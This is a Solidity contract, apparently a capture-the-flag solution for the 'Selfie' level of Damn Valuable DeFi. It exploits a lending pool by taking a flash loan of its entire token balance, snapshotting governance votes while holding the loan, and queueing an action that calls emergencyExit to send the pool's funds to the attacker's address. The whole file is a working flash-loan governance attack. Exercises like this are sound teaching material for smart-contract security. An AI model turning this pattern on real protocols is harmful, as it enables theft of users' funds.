// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool public selfiePool;
    ISimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address public owner;
    uint256 public actionId;

    constructor(address selfiePoolAddress, address governanceAddress, address tokenAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
        governance = ISimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        owner = msg.sender;
    }

    function attack() external {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(selfiePool)), ""
        );
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external override returns (bytes32) {
        token.snapshot();
        actionId =
            governance.queueAction(address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
        token.approve(msg.sender, token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
